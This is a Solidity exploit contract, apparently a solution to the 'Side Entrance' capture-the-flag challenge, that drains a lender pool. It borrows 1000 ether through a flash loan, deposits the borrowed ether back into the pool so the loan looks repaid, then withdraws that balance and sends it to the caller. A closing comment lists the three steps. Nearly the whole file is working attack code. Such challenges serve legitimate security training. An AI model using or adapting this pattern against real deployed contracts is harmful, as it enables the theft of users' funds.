// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./SideEntranceLenderPool.sol";

contract SideEntranceAttack {
    SideEntranceLenderPool public target;

    constructor(address _target) {
        target = SideEntranceLenderPool(_target);
    }

    function attack() external {
        target.flashLoan(1000 ether);
    }

    function takeMoney() external {
        target.withdraw();
        (bool sent, ) = msg.sender.call{value: 1000 ether}("");
        require(sent);
    }

    function execute() external payable {
        // do what you want with the flashloan here
        target.deposit{value: 1000 ether}();
    }

    receive() external payable {}
}

/*
    - take out flash loan for 1000 eth
    - during flash loan execution, deposit the 1000 eth into the contract (this will satisfy the flash loan requirement)
    - then after the flashloan is paid back, call the withdraw() function to withdraw the 1000 eth
*/